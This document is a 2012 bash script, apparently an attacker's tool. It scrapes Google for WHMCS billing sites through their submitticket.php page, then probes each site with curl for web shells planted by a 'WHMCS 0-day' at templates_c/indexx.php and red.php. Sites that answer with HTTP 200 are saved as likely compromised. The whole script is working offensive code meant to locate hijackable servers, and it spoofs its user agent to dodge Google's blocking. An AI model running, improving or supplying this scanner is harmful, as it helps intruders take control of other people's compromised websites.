#!/bin/bash
#BETA 0.01
clear
cont=0
total=$1
total2=`expr $total \* 10`
PAGES=`echo $total2| sed 's/.$//'`
dork=$2
seconds=$3
[ $# -eq 0 ] && { echo "Usage: $0 $1 [ example: 10 submitticket.php 0 ]"; exit 1; }


function scan {
echo ""
grep -o 'http://[^"]*.php' googleCRAWLED | sed '/google/d' | sort -u| grep -w 'submitticket.php' | grep -v q=submitticket.php | grep -v submitticket-php  | grep -w 'submitticket.php' --color=always | nl &&
grep -o 'http://[^"]*.php' googleCRAWLED | sed '/google/d' | sort -u| grep -w 'submitticket.php' | grep -v q=submitticket.php | grep -v submitticket-php  | grep -w 'submitticket.php'  > sitesWHMCS1.txt &&
sort -u sitesWHMCS1.txt  >  sites.WHMCS.txt &&
echo "" 
echo -e " \033[42;1;37m Results save in. sites.WHCMS.txt ::TOTAL::\033[0m" && echo "" && wc -l sites.WHMCS.txt
echo ""
echo ""
echo -n -e "\033[41;1;36m TOTAL OF PAGES:  $PAGES \033[0m" 
echo ""
echo ""
echo "Loading possible pages injection web-shell"
#sed   "s/submitticket.php/submitticket.php\?step=2\&deptid=25/g; s/1//g; s/[[:space:]]//g"  sites.WHMCS.txt > manual-explore.txt



echo 
echo -e "\033[0;32m Change Directory..\033[0m"
echo ""

sed   "s/submitticket.php/templates_c\/indexx\.php/g; s/1//g; s/[[:space:]]//g"  sites.WHMCS.txt > changed-urls.txt
sed   "s/submitticket.php/templates_c\/red\.php/g; s/1//g; s/[[:space:]]//g"  sites.WHMCS.txt >> changed-urls.txt


grep -n "ht" changed-urls.txt | sed "s/^/\$/g; s/:h/=\"h/g; s/$/\"/g; p; s/^/echo -e /g; s/\=[^>]*//g" > one



grep -n "ht" changed-urls.txt | sed "s/^/\$/g; s/:h/=\"h/g; s/$/\"/g;  p; s/^/\`curl -s -I \"/g; s/$/\"| cut -c1-15 | sed '\/HTTP\\\\\/1\.1 200 OK\/\!d'\` \''/g;s/=[^>]*php//g; s/\"//g" > two


paste one two > checagem.sh


echo ""
sed 's/\$/\A/g; s/echo -e A/echo -e \$A/; s/-I A/-I \$A/;' checagem.sh > Go-Scan.sh &&
echo -e "\033[0;32m ####################################################\033[0m"
echo -e "\033[0;32m #Seaking... SHELL uploaded (WHMCS 0-day March 2012)#\033[0m"
echo -e "\033[0;32m ####################################################\033[0m"

sh Go-Scan.sh &&
sh Go-Scan.sh >> list.txt &&
grep 200 list.txt > Scanned.txt
rm googleCRAWLED  checagem.sh changed-urls.txt  Go-Scan.sh  list.txt one two
echo "" 
echo ""
echo -e '\033[01;37mSites with HTTP Response 200 in link \033[04;32mPossible vulnerable\033[00;37m!!!'
echo " Save Possible php-shell in: Scanned.txt"
echo "  Finished!!!"
exit
}




echo -e "\033[0;32m #####################################################################\033[0m"
echo -e "\033[0;32m # \033[01;34;47mG\033[01;31mO\033[01;33mO\033[01;34mG\033[01;32mL \033[01;31mE\033[00;37;40m \033[0;32mCRAWLER WHMCS Submitticket.php (By Kernel) 25/03/2012 #####\033[0m"
echo -e "\033[0;32m # contact: kernel18@gmail.com                                     ###\033[0m"
echo -e "\033[0;32m #####################################################################\033[0m"

echo ""
echo "Counter page google "$PAGES
echo ""
curl --user-agent "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)" -s "http://www.google.com.br/search?q=$dork&num=100&start=$cont&filter=0" >> googleCRAWLED
grep  "Aproximadamente"  googleCRAWLED | sed 's/.*resultStats>//; s/<nobr>.*//'
echo ""
rm googleCRAWLED


function checks {
checker=`grep -o "302 Moved" googleCRAWLED | tail -n1`

if [ "$checker" = "302 Moved" ]; then
echo "Your IP Blocked by google :]"
scan
fi
} 


	until [ $cont = $total2 ]; do

curl --user-agent "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)" -s "http://www.google.com.br/search?q=$dork&num=100&start=$contagem&filter=0" >> googleCRAWLED
  
echo -n -e "\033[41;1;36m#\033[0m"
sleep $seconds
  cont=`expr $cont + 10`
checks
 done



echo -n -e "\033[41;1;36m[100%]\033[0m"
echo ""

echo ""
echo ""
echo ""
scan



